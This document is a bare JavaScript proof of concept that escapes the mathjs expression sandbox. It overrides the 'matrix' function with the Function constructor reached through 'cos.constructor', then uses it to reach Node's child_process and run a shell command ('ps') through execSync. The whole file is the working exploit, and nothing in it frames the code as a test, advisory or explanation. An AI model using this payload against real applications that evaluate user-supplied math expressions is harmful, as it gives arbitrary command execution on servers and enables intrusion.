const math = require("mathjs");
math.eval(
  'import({matrix:cos.constructor},{override:1});x=["process.mainModule.require(\\"child_process\\").execSync(\\"ps >&2\\")"];x()'
);
